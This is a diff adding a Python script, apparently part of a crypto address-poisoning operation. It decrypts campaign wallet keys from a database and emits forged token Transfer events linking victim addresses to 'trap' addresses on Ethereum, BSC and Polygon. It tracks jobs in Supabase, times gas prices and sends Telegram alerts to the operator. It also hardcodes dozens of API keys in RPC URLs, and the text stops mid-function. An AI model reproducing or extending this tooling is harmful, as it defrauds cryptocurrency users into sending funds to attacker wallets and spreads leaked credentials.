@@ -1,0 +1,1999 @@
+
+===== FILE: tools/duster.py =====
+#!/usr/bin/env python3
+import sys
+import os
+import re
+import time
+import argparse
+import json
+import urllib.request
+from datetime import datetime, timezone
+from web3 import Web3
+from dotenv import load_dotenv
+from web3.exceptions import TimeExhausted
+
+# --- Ensure we don't let .env overwrite OS-level PM2 variables ---
+load_dotenv(override=False)
+
+# --- Gas Reserve Configuration ---
+# Amount in USD to keep as a reserve in the trap wallet for future gas fees
+GAS_RESERVE_USD = float(os.getenv("GAS_RESERVE_USD", "0.20"))
+
+# --- Official POA middleware import ---
+try:
+    from web3.middleware import geth_poa_middleware
+except ImportError:
+    try:
+        from web3.middleware import poa
+        geth_poa_middleware = poa
+    except ImportError:
+        try:
+            from web3.middleware import geth_poa
+            geth_poa_middleware = geth_poa
+        except ImportError:
+            geth_poa_middleware = None
+            print('[DEBUG] POA middleware not found; BSC/Polygon may have extraData errors.')
+
+# Add project root to path
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+
+from lib.config import config
+from lib.logger import logger
+from lib.notifier import send_telegram
+from lib.shutdown import setup_graceful_shutdown
+from lib.encryption import decrypt
+
+# --- Supabase client for job tracking ---
+try:
+    from supabase import create_client
+except ImportError:
+    create_client = None
+
+SUPABASE_URL = os.getenv("NEXT_PUBLIC_SUPABASE_URL")
+SUPABASE_KEY = os.getenv("SUPABASE_SERVICE_ROLE_KEY")
+supabase = None
+if SUPABASE_URL and SUPABASE_KEY and create_client:
+    # 🚀 FIX: Compatible with both Supabase v1.x and v2.x+
+    supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
+    
+    # Manually patch the underlying HTTP client timeout if it exists
+    try:
+        import httpx
+        timeout_config = httpx.Timeout(60.0, connect=10.0)
+        if hasattr(supabase, '_client') and hasattr(supabase._client, 'timeout'):
+            supabase._client.timeout = timeout_config
+    except Exception:
+        pass # Silently ignore if httpx isn't available or structure changed
+    print("[DEBUG] Supabase client initialized successfully")
+
+# ─── Read preferred asset from environment (set by re_poison.js) ───
+PREFERRED_ASSET = os.getenv("DUST_ASSET")
+if PREFERRED_ASSET:
+    print(f'[DEBUG] PREFERRED_ASSET from env: {PREFERRED_ASSET}')
+else:
+    print('[DEBUG] No PREFERRED_ASSET set, will use default fallback')
+
+def update_job(job_id, status=None, progress=None, total=None, message=None):
+    """Update job status in Supabase with proper ISO timestamps."""
+    if not supabase or not job_id:
+        return
+    data = {}
+    if status is not None:
+        data["status"] = status
+    if progress is not None:
+        data["progress"] = progress
+    if total is not None:
+        data["total"] = total
+    if message is not None:
+        data["message"] = message
+        
+    iso_now = datetime.now(timezone.utc).isoformat()
+    if status == "running" and "started_at" not in data:
+        data["started_at"] = iso_now
+    if status in ("completed", "failed"):
+        data["completed_at"] = iso_now
+
+    if not data:
+        return
+
+    try:
+        supabase.table("jobs").update(data).eq("id", job_id).execute()
+    except Exception as e:
+        logger.error(f"Failed to update job {job_id}: {e}")
+
+def get_campaign_id_from_job(job_id):
+    """Retrieve campaign_id from job record."""
+    if not supabase:
+        return None
+    try:
+        result = supabase.table("jobs").select("campaign_id").eq("id", job_id).execute()
+        if result.data:
+            return result.data[0]["campaign_id"]
+    except Exception as e:
+        logger.error(f"Failed to get campaign_id for job {job_id}: {e}")
+    return None
+
+print('[DEBUG] Starting duster.py...')
+
+# --- MULTI‑CHAIN: STRICT PM2 Env Var Prioritization ---
+CHAIN = os.getenv('CHAIN') or getattr(config, 'CHAIN', 'ethereum')
+chain_cfg = config.get_chain_config() if hasattr(config, 'get_chain_config') else None
+
+if chain_cfg and 'tokens' in chain_cfg:
+    TOKEN_CONFIG = chain_cfg['tokens']
+else:
+    TOKEN_CONFIG = config.TOKEN_CONFIG
+
+if chain_cfg and 'dust' in chain_cfg:
+    DUST_AMOUNT = chain_cfg['dust']
+else:
+    DUST_AMOUNT = config.DUST_AMOUNT
+
+NATIVE_SYMBOL = chain_cfg['native_symbol'] if chain_cfg and 'native_symbol' in chain_cfg else 'ETH'
+
+if hasattr(config, 'get_chain_rpc'):
+    RPC_URL = config.get_chain_rpc()
+else:
+    RPC_URL = config.DUSTER_RPC_URL
+
+if RPC_URL is None or RPC_URL == "":
+    RPC_URL = os.getenv("DUSTER_RPC_URL") or os.getenv("NODE_RPC_URL")
+
+print(f'[DEBUG] Chain: {CHAIN}, Native symbol: {NATIVE_SYMBOL}')
+print('[DEBUG] DUST_AMOUNT:', DUST_AMOUNT)
+print('[DEBUG] TOKEN_CONFIG:', TOKEN_CONFIG)
+print(f'[DEBUG] Using RPC: {RPC_URL}')
+
+# --- Custom HTTPProvider that truncates extraData for POA chains ---
+class POAHTTPProvider(Web3.HTTPProvider):
+    def make_request(self, method, params):
+        response = super().make_request(method, params)
+        if method in ('eth_getBlockByNumber', 'eth_getBlockByHash'):
+            if 'result' in response and 'extraData' in response['result']:
+                extra = response['result']['extraData']
+                if isinstance(extra, str):
+                    extra_bytes = bytes.fromhex(extra[2:] if extra.startswith('0x') else extra)
+                else:
+                    extra_bytes = extra
+                if len(extra_bytes) > 32:
+                    response['result']['extraData'] = '0x' + extra_bytes[:32].hex()
+        return response
+
+# Handle POA middleware import across different web3.py versions
+try:
+    from web3.middleware import geth_poa_middleware
+except ImportError:
+    try:
+        from web3.middleware import ExtraDataToPOAMiddleware as geth_poa_middleware
+    except ImportError:
+        geth_poa_middleware = None
+
+
+# ─── Public RPC fallbacks (Verified High-Availability Nodes) ───
+PUBLIC_RPC_FALLBACKS = {
+    'bsc': [
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_6gTznTT4QnX3_0IE9gkY-',
+    'https://bsc-dataseed.binance.org',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_z1J_ESjjLVZwSBLNoep84',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_-NvhHn24EgwhuMt38pZJr',
+    'https://rpc.ankr.com/bsc',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_8ToIPT9Z3R1iQ55nksx8b',
+    'https://bsc.publicnode.com',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_Qy6hQXdtdVlE7Z4uVxt_A',
+    'https://1rpc.io/bnb',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_rniHI4MxzjBfNZ4bxmDu5',
+    'https://bsc.drpc.org',
+    'https://bnb-mainnet.g.alchemy.com/v2/LW3i2zPypSVe0cl4BxCxI',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_WQp652MAlfKFbtD1A-zNh'
+  ],
+  'polygon': [
+    'https://polygon-mainnet.g.alchemy.com/v2/CByFU5cCGAYyh8EHLamXD',
+    'https://polygon-rpc.com',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_UdSkrC6LFs2HGS0VUGg5O',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_tAPr1C9JUzQZYax5pslu5',
+    'https://rpc.ankr.com/polygon',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_Bq31mnvxmjdT70RCYLGLA',
+    'https://polygon.llamarpc.com',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_17XYrB1qagYO9Edwxj7Cw',
+    'https://polygon.publicnode.com',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_UQzY-saHkZZrowH7kylTu',
+    'https://1rpc.io/polygon',
+    'https://polygon-mainnet.g.alchemy.com/v2/c6MIVgnVjXC0kgDH4BItE',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_3_N_bgLVSl1zoRzlypO11'
+  ],
+  'ethereum': [
+    'https://eth-mainnet.g.alchemy.com/v2/alch_F5VimAPoBoESKZ566us-U',
+    'https://ethereum.publicnode.com',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_x_oSlpf2bnfc6brp-BgzA',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_tp8k4HI9tVpUEBmsF3kXc',
+    'https://rpc.ankr.com/eth',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_7viyR-7wWLgc2i9suQ6hS',
+    'https://eth.llamarpc.com',
+    'https://eth-mainnet.g.alchemy.com/v2/ig-ZUQrtw2shXhW2NuT6W',
+    'https://1rpc.io/eth',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_dFm-5A7LhWtYU3_4Y103o',
+    'https://eth.drpc.org',
+    'https://eth-mainnet.g.alchemy.com/v2/gODtbeuBQLkTJAm3e9tB1',
+    'https://eth-mainnet.g.alchemy.com/v2/GsO461DZvmNGh4O4Ss5Et'
+  ],
+}
+
+# ─── Alchemy RPCs for deep history fetching ───
+ALCHEMY_RPCS = {
+    'bsc': [
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_DMA2jJjcrOWJ9R10_Fx5k',
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_bBpETSAAmA8VjshNMBkLn',
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_VJ0_4LOGnzlbo7NPkqhg-',
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_6gTznTT4QnX3_0IE9gkY-',
+         'https://bnb-mainnet.g.alchemy.com/v2/alch_3_Bpj7ORVica5UbSitOXm',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_AMGRdQ1DjpCspfYgaJWk8',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_n0iXFk0U2atdbZFyJw3Vd',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_uG-HMTi_h9uFfpZ0IPtUC',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_Of_5h7lrnjaNskMMN1m_O',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_JXJn_G0u41v-ORLH-PLvm',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_6DY1YYDbhjfaDTRvVlb8E',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_FY7h0VVmtvSHzWHULlBYD',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_e2hNo6urdy-p9K3iCKBRz',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_wT_5s_3jEKZRUHS6-9qlB',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_xo7rkNtpCG3XTTte_34Oe',
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_z1J_ESjjLVZwSBLNoep84',
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_-NvhHn24EgwhuMt38pZJr',
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_8ToIPT9Z3R1iQ55nksx8b',
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_Qy6hQXdtdVlE7Z4uVxt_A',
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_rniHI4MxzjBfNZ4bxmDu5',
+        'https://bnb-mainnet.g.alchemy.com/v2/LW3i2zPypSVe0cl4BxCxI',
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_WQp652MAlfKFbtD1A-zNh',
+    ],
+    'polygon': [
+        'https://polygon-mainnet.g.alchemy.com/v2/alch_qfGoxus-szPvLI44z9YWw',
+        'https://polygon-mainnet.g.alchemy.com/v2/alch_fcNea90VExKd5DNvSguRa',
+        'https://polygon-mainnet.g.alchemy.com/v2/alch_sr3YXfVMNVZJ5qSCU0kyD',
+         'https://polygon-mainnet.g.alchemy.com/v2/alch_6bgVHMAQFQbOqC7cHZ5tU',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_e1PIp-UVXQ1jZWINkbmDm',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_n9bFKwbW1lFSXd-CTjFA8',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_VXeIGTUmcC8G4X4a4Lx8e',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_adXxpjamb8lNBSSnH-dZF',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_vUHRCAI2B5z-NVbge5MjR',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_YXuYd2T6nO-_ASx3VyYd8',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_o4lfkzzsAyG0uEFq9cfx0',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_6vT8KHKebKLX2IzQCgHpo',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_C7D8h3Jq99k3QweZHq1Ip',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_1t_00WgSdtEqIYYRY8LdA',
+        'https://polygon-mainnet.g.alchemy.com/v2/CByFU5cCGAYyh8EHLamXD',
+        'https://polygon-mainnet.g.alchemy.com/v2/alch_UdSkrC6LFs2HGS0VUGg5O',
+        'https://polygon-mainnet.g.alchemy.com/v2/alch_tAPr1C9JUzQZYax5pslu5',
+        'https://polygon-mainnet.g.alchemy.com/v2/alch_Bq31mnvxmjdT70RCYLGLA',
+        'https://polygon-mainnet.g.alchemy.com/v2/alch_17XYrB1qagYO9Edwxj7Cw',
+        'https://polygon-mainnet.g.alchemy.com/v2/alch_UQzY-saHkZZrowH7kylTu',
+        'https://polygon-mainnet.g.alchemy.com/v2/c6MIVgnVjXC0kgDH4BItE',
+        'https://polygon-mainnet.g.alchemy.com/v2/alch_3_N_bgLVSl1zoRzlypO11',
+    ],
+    'ethereum': [
+        'https://eth-mainnet.g.alchemy.com/v2/alch_0hEit_izstW7cL9Gyz_T_',
+        'https://eth-mainnet.g.alchemy.com/v2/alch_A0-PobPGMyEAZ31xva35A',
+        'https://eth-mainnet.g.alchemy.com/v2/alch_D_FWof7AulPvkFHZnDlFn',
+         'https://eth-mainnet.g.alchemy.com/v2/alch_3smRQUoTzfj_NPiK6451s',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_xp0ppatuXONHI2pClS7_M',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_hmts-IFXko93muF8BaX5Q',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_8fJp6NiVdGxCOljdKCDZi',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_4euFfPOpJDglYNRQYKWhO',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_bjwK80RPIzP774OVkp-vE',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_LcoDsDwyyl7fbYUvffKYC',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_btTtYZmxG7VfNjY_jZIJr',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_IP1SsCj0wqzZqrvhH_Rv5',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_1O0yoHMsrXCOe3lOHu7dc',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_w2NDE7Pilr5cpIPb51Wsx',
+        'https://eth-mainnet.g.alchemy.com/v2/alch_F5VimAPoBoESKZ566us-U',
+        'https://eth-mainnet.g.alchemy.com/v2/alch_x_oSlpf2bnfc6brp-BgzA',
+        'https://eth-mainnet.g.alchemy.com/v2/alch_tp8k4HI9tVpUEBmsF3kXc',
+        'https://eth-mainnet.g.alchemy.com/v2/alch_7viyR-7wWLgc2i9suQ6hS',
+        'https://eth-mainnet.g.alchemy.com/v2/ig-ZUQrtw2shXhW2NuT6W',
+        'https://eth-mainnet.g.alchemy.com/v2/alch_dFm-5A7LhWtYU3_4Y103o',
+        'https://eth-mainnet.g.alchemy.com/v2/gODtbeuBQLkTJAm3e9tB1',
+        'https://eth-mainnet.g.alchemy.com/v2/GsO461DZvmNGh4O4Ss5Et',
+    ],
+}
+
+
+# ─── Mirror Token Contracts ───
+# Stablecoins
+MIRROR_TOKEN_USDC = os.getenv("MIRROR_TOKEN_USDC")
+MIRROR_TOKEN_USDT = os.getenv("MIRROR_TOKEN_USDT")
+MIRROR_TOKEN_DAI = os.getenv("MIRROR_TOKEN_DAI")
+MIRROR_TOKEN_EURC = os.getenv("MIRROR_TOKEN_EURC")
+MIRROR_TOKEN_EURCV = os.getenv("MIRROR_TOKEN_EURCV")
+
+# Wrapped tokens
+MIRROR_TOKEN_WBTC = os.getenv("MIRROR_TOKEN_WBTC")
+MIRROR_TOKEN_cbETH = os.getenv("MIRROR_TOKEN_cbETH")
+MIRROR_TOKEN_WETH = os.getenv("MIRROR_TOKEN_WETH")
+
+# DeFi tokens
+MIRROR_TOKEN_LINK = os.getenv("MIRROR_TOKEN_LINK")
+MIRROR_TOKEN_AAVE = os.getenv("MIRROR_TOKEN_AAVE")
+MIRROR_TOKEN_ENA = os.getenv("MIRROR_TOKEN_ENA")
+MIRROR_TOKEN_CHEX = os.getenv("MIRROR_TOKEN_CHEX")
+
+# Meme coins
+MIRROR_TOKEN_SHIB = os.getenv("MIRROR_TOKEN_SHIB")
+MIRROR_TOKEN_PEPE = os.getenv("MIRROR_TOKEN_PEPE")
+MIRROR_TOKEN_DOGE = os.getenv("MIRROR_TOKEN_DOGE")
+MIRROR_TOKEN_BONK = os.getenv("MIRROR_TOKEN_BONK")
+
+# Other tokens
+MIRROR_TOKEN_WLFI = os.getenv("MIRROR_TOKEN_WLFI")
+MIRROR_TOKEN_HEX = os.getenv("MIRROR_TOKEN_HEX")
+MIRROR_TOKEN_CRCLon = os.getenv("MIRROR_TOKEN_CRCLon")
+
+# Native coins
+MIRROR_TOKEN_NATIVE = os.getenv("MIRROR_TOKEN_NATIVE")
+
+MIRROR_CONTRACTS = {
+    # Stablecoins
+    "USDC": MIRROR_TOKEN_USDC,
+    "USDT": MIRROR_TOKEN_USDT,
+    "DAI": MIRROR_TOKEN_DAI,
+    "EURC": MIRROR_TOKEN_EURC,
+    "EURCV": MIRROR_TOKEN_EURCV,
+    
+    # Wrapped tokens
+    "WBTC": MIRROR_TOKEN_WBTC,
+    "cbETH": MIRROR_TOKEN_cbETH,
+    "WETH": MIRROR_TOKEN_WETH,
+    
+    # DeFi tokens
+    "LINK": MIRROR_TOKEN_LINK,
+    "AAVE": MIRROR_TOKEN_AAVE,
+    "ENA": MIRROR_TOKEN_ENA,
+    "CHEX": MIRROR_TOKEN_CHEX,
+    
+    # Meme coins
+    "SHIB": MIRROR_TOKEN_SHIB,
+    "PEPE": MIRROR_TOKEN_PEPE,
+    "DOGE": MIRROR_TOKEN_DOGE,
+    "BONK": MIRROR_TOKEN_BONK,
+    
+    # Other tokens
+    "WLFI": MIRROR_TOKEN_WLFI,
+    "HEX": MIRROR_TOKEN_HEX,
+    "CRCLon": MIRROR_TOKEN_CRCLon,
+    
+    # Native coins (all use the same contract)
+    "ETH": MIRROR_TOKEN_NATIVE,
+    "BNB": MIRROR_TOKEN_NATIVE,
+    "MATIC": MIRROR_TOKEN_NATIVE,
+}
+
+MIRROR_ABI = json.loads('[{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address[]","name":"froms","type":"address[]"},{"internalType":"address[]","name":"tos","type":"address[]"},{"internalType":"uint256[]","name":"values","type":"uint256[]"}],"name":"batchEmitTransfers","outputs":[],"stateMutability":"nonpayable","type":"function"}]')
+
+# ─── Multi-Token Router Configuration ───
+MULTI_TOKEN_ROUTER = os.getenv("MULTI_TOKEN_ROUTER")
+MULTI_TOKEN_ROUTER_ABI = json.loads('[{"inputs":[{"components":[{"internalType":"address","name":"target","type":"address"},{"internalType":"address[]","name":"froms","type":"address[]"},{"internalType":"address[]","name":"tos","type":"address[]"},{"internalType":"uint256[]","name":"values","type":"uint256[]"}],"internalType":"struct MultiTokenBatchRouter.BatchCall[]","name":"calls","type":"tuple[]"}],"name":"transfer","outputs":[],"stateMutability":"nonpayable","type":"function"}]')
+def get_token_decimals(asset_symbol):
+    """Get the correct number of decimals for a token symbol."""
+    decimals_map = {
+        # Native coins (18 decimals)
+        'ETH': 18,
+        'BNB': 18,
+        'MATIC': 18,
+        'WETH': 18,
+        'WBNB': 18,
+        'WMATIC': 18,
+        
+        # Stablecoins with 6 decimals
+        'USDC': 6,
+        'USDT': 6,
+        'EURC': 6,
+        'USDP': 6,
+        'BUSD': 6,
+        
+        # Stablecoins with 18 decimals
+        'DAI': 18,
+        'EURCV': 18,
+        'TUSD': 18,
+        'FRAX': 18,
+        
+        # Bitcoin variants (8 decimals)
+        'WBTC': 8,
+        'renBTC': 8,
+        
+        # DeFi tokens (18 decimals)
+        'LINK': 18,
+        'AAVE': 18,
+        'ENA': 18,
+        'CHEX': 18,
+        'cbETH': 18,
+        
+        # Meme coins
+        'SHIB': 18,
+        'PEPE': 18,
+        'DOGE': 18,
+        'BONK': 5,  # BONK uses 5 decimals
+        
+        # Other tokens
+        'WLFI': 18,
+        'HEX': 8,  # HEX uses 8 decimals
+        'CRCLon': 18,
+    }
+    
+    symbol = asset_symbol.upper()
+    decimals = decimals_map.get(symbol)
+    
+    if decimals is None:
+        logger.warning(f"Unknown token '{asset_symbol}', defaulting to 18 decimals")
+        return 18
+    
+    return decimals
+
+
+# Mirror uses the campaign funding wallet as operator (same as re_poison.js)
+def get_mirror_operator_key(campaign_id):
+    """Fetch and decrypt the funding key for mirror operations."""
+    if not supabase or not campaign_id:
+        return None
+    try:
+        result = supabase.table("campaigns").select("funding_private_key_enc").eq("id", campaign_id).execute()
+        if not result.data:
+            return None
+        enc_key = result.data[0].get("funding_private_key_enc")
+        if not enc_key:
+            return None
+        funding_key = decrypt(enc_key).strip()
+        if not funding_key.startswith('0x'):
+            funding_key = f'0x{funding_key}'
+        return funding_key
+    except Exception as e:
+        logger.error(f"Failed to get mirror operator key: {e}")
+        return None
+
+
+def send_insufficient_gas_alert(operator_addr, needed_eth, have_eth, shortfall, campaign_id, context="Mirror"):
+    """Send a rate-limited Telegram alert for insufficient gas (once per hour per wallet)."""
+    now = time.time()
+    last_alert = _last_gas_insufficient_alert.get(operator_addr, 0)
+    if now - last_alert > 3600: # Rate limit: Once per hour
+        # Map chain to CoinGecko ID
+        coin_id = "ethereum"
+        if CHAIN.lower() == "bsc": coin_id = "binancecoin"
+        elif CHAIN.lower() == "polygon": coin_id = "matic-network"
+        
+        try:
+            price_data = json.loads(urllib.request.urlopen(
+                urllib.request.Request(
+                    f"https://api.coingecko.com/api/v3/simple/price?ids={coin_id}&vs_currencies=usd",
+                    headers={'User-Agent': 'CipherNet/1.0'}
+                ), timeout=3
+            ).read().decode())
+            native_price = price_data[coin_id]['usd']
+            needed_usd = float(needed_eth) * native_price
+            have_usd = float(have_eth) * native_price
+            fund_usd = max(10.0, float(shortfall) * native_price * 100)
+            fund_native = fund_usd / native_price
+            price_line = f" (~${needed_usd:.2f} needed, ~${have_usd:.4f} balance)"
+            fund_suggestion = f"{fund_native:.4f} {NATIVE_SYMBOL} (~${fund_usd:.2f})"
+        except Exception:
+            price_line = ""
+            fund_suggestion = f"0.01 {NATIVE_SYMBOL}"
+        
+        alert_msg = (
+            f"⛽ Insufficient Gas in Funding Wallet ({context})\n\n"
+            f"Your campaign funding wallet cannot emit batch events.\n\n"
+            f"🔑 Wallet: `{operator_addr}`\n"
+            f"📊 Needed: `{needed_eth:.8f} {NATIVE_SYMBOL}`{price_line}\n"
+            f"💰 Balance: `{have_eth:.8f} {NATIVE_SYMBOL}`\n"
+            f"📉 Shortfall: `{shortfall:.8f} {NATIVE_SYMBOL}`\n\n"
+            f"💡 Fund this wallet with at least **{fund_suggestion}** to continue operations."
+        )
+        send_telegram(alert_msg, campaign_id=campaign_id)
+        _last_gas_insufficient_alert[operator_addr] = now
+    
+
+def get_explorer_url(address, link_type='address'):
+    """Generate Etherscan/BscScan/PolygonScan URL."""
+    base_urls = {
+        'ethereum': 'https://etherscan.io',
+        'bsc': 'https://bscscan.com',
+        'polygon': 'https://polygonscan.com'
+    }
+    base_url = base_urls.get(CHAIN.lower(), 'https://etherscan.io')
+    
+    if link_type == 'tx':
+        return f"{base_url}/tx/{address}"
+    return f"{base_url}/address/{address}#tokentxns"
+
+
+def notify_gas_strategy(campaign_id, used_fallback, final_gwei):
+    """Send a Telegram notification about which gas strategy was used."""
+    try:
+        if used_fallback:
+            msg = (
+                f"⚠️ *Gas Strategy: Fallback Used*\n\n"
+                f"The network stayed congested for 90 minutes.\n\n"
+                f"⛽ *Firing at Market Rate:* `{final_gwei:.2f} Gwei`\n\n"
+                f"💡 _This ensures your nonces don't get stuck, but costs slightly more._"
+            )
+            send_telegram(msg, campaign_id=campaign_id)
+        else:
+            msg = (
+                f"✅ *Gas Strategy: Cheap Gas Sniped!*\n\n"
+                f"The network is currently uncongested.\n\n"
+                f"⛽ *Firing at Cheap Rate:* `{final_gwei:.2f} Gwei`\n\n"
+                f"💰 _Saving you money on this batch!_"
+            )
+            send_telegram(msg, campaign_id=campaign_id)
+    except Exception as e:
+        logger.warning(f"[gas-strategy] Failed to send gas notification: {e}")
+
+def check_operator_balance_and_alert(w3, operator_addr, estimated_gas, gas_params, campaign_id, context):
+    """Checks if operator has enough balance for gas. Returns True if OK, False if insufficient."""
+    operator_balance = call_with_retry(w3.eth.get_balance, operator_addr)
+    gas_price = gas_params.get('maxFeePerGas', gas_params.get('gasPrice', 0))
+    gas_cost = estimated_gas * gas_price
+    
+    if operator_balance < gas_cost:
+        needed_eth = float(w3.from_wei(gas_cost, 'ether'))
+        have_eth = float(w3.from_wei(operator_balance, 'ether'))
+        shortfall = needed_eth - have_eth
+        logger.error(f"[{context}] Insufficient gas. Need {needed_eth}, have {have_eth}")
+        send_insufficient_gas_alert(operator_addr, needed_eth, have_eth, shortfall, campaign_id, context=context)
+        return False
+    return True    
+
+
+def get_smart_gas_params(w3, context="[gas-strategy]", campaign_id=None):
+    """
+    Smart Gas Strategy: Wait for cheap gas (0.5 Gwei), but fallback to spot price 
+    if it takes longer than 10 minutes to prevent stuck nonces.
+    """
+    default_max_fee = w3.to_wei(2, 'gwei')
+    default_priority = w3.to_wei(0.01, 'gwei')
+    
+    target_max_fee = w3.to_wei(0.5, 'gwei')
+    network_tip = w3.to_wei(0.01, 'gwei')
+    
+    used_fallback = False
+    final_gwei = 0.0
+    
+    try:
+        latest_block = call_with_retry(w3.eth.get_block, "latest")
+        base_fee = latest_block.get("baseFeePerGas", 0) or 0
+        base_fee_gwei = float(w3.from_wei(base_fee, 'gwei'))
+        target_gwei = float(w3.from_wei(target_max_fee, 'gwei'))
+        final_gwei = base_fee_gwei
+        
+        if base_fee <= target_max_fee:
+            final_max_fee = base_fee + network_tip
+            logger.info(f"{context} ✅ Base fee is cheap ({base_fee_gwei:.2f} Gwei). Firing immediately!")
+        else:
+            logger.info(f"{context} ⏳ Base fee is {base_fee_gwei:.2f} Gwei. Waiting up to 90 mins for it to drop to <{target_gwei} Gwei...")
+            
+            gas_dropped = False
+            for i in range(90): # 90 iterations * 60s = 90 mins (1.5 hours)
+                time.sleep(60)
+                
+                try:
+                    current_block = call_with_retry(w3.eth.get_block, "latest")
+                    current_base_fee = current_block.get("baseFeePerGas", 0) or 0
+                    current_gwei = float(w3.from_wei(current_base_fee, 'gwei'))
+                    final_gwei = current_gwei
+                    
+                    if current_base_fee <= target_max_fee:
+                        final_max_fee = current_base_fee + network_tip
+                        gas_dropped = True
+                        logger.info(f"{context} ✅ Base fee dropped to {current_gwei:.2f} Gwei! Firing at cheap rate!")
+                        break
+                    
+                    if i % 10 == 0:
+                        logger.info(f"{context} ⏳ Still waiting... Current base fee: {current_gwei:.2f} Gwei")
+                except Exception as e:
+                    logger.warning(f"{context} Failed to check base fee: {e}")
+                    break
+                    
+            if not gas_dropped:
+                used_fallback = True
+                try:
+                    fallback_block = call_with_retry(w3.eth.get_block, "latest")
+                    fallback_base_fee = fallback_block.get("baseFeePerGas", base_fee) or base_fee
+                    final_max_fee = fallback_base_fee + network_tip
+                    fallback_gwei = float(w3.from_wei(fallback_base_fee, 'gwei'))
+                    final_gwei = fallback_gwei
+                    logger.warning(f"{context} ⚠️ Gas stayed high for 90 mins. Firing at current market rate ({fallback_gwei:.2f} Gwei) to prevent stuck nonces.")
+                except Exception as e:
+                    final_max_fee = base_fee + network_tip
+                    logger.warning(f"{context} ⚠️ Gas check failed. Firing at original base fee.")
+                    
+        # 🚀 Send Telegram Notification
+        if campaign_id:
+            notify_gas_strategy(campaign_id, used_fallback, final_gwei)
+            
+        return {'maxFeePerGas': final_max_fee, 'maxPriorityFeePerGas': network_tip}
+        
+    except Exception as e:
+        logger.warning(f"{context} Failed to estimate fees, using defaults: {e}")
+        return {'maxFeePerGas': default_max_fee, 'maxPriorityFeePerGas': default_priority}
+
+
+def emit_mirror_transfer(victim_address, trap_address, raw_value, asset, campaign_id):
+    """
+    Emit a forged Transfer event via MirrorToken contract.
+    Returns tx_hash on success, None on failure.
+    """
+        # Try exact match, then uppercase, then fallback to native ETH contract
+    contract_address = (
+        MIRROR_CONTRACTS.get(asset) or 
+        MIRROR_CONTRACTS.get(asset.upper()) or 
+        MIRROR_TOKEN_NATIVE  # 🆕 Fallback to native ETH stealth contract
+    )
+    if not contract_address:
+        logger.warning(f"[mirror] No MirrorToken contract configured for {asset} (no fallback available)")
+        return None
+    
+    # Log fallback usage for unknown tokens
+    is_fallback = (
+        contract_address == MIRROR_TOKEN_NATIVE and 
+        asset.upper() not in ('ETH', 'BNB', 'MATIC')
+    )
+    if is_fallback:
+        logger.info(f"[mirror] Using ETH fallback contract for unknown token: {asset}")
+
+    operator_key = get_mirror_operator_key(campaign_id)
+    if not operator_key:
+        logger.warning(f"[mirror] No funding key for campaign {campaign_id}, cannot emit mirror")
+        return None
+
+    try:
+        operator_account = w3.eth.account.from_key(operator_key)
+        operator_addr = operator_account.address
+
+        contract = w3.eth.contract(
+            address=w3.to_checksum_address(contract_address),
+            abi=MIRROR_ABI
+        )
+
+        nonce = call_with_retry(w3.eth.get_transaction_count, operator_addr, "pending")
+
+        # Use low gas - mirror only needs ~50k gas
+        latest_block = call_with_retry(w3.eth.get_block, "latest")
+        use_eip1559 = (
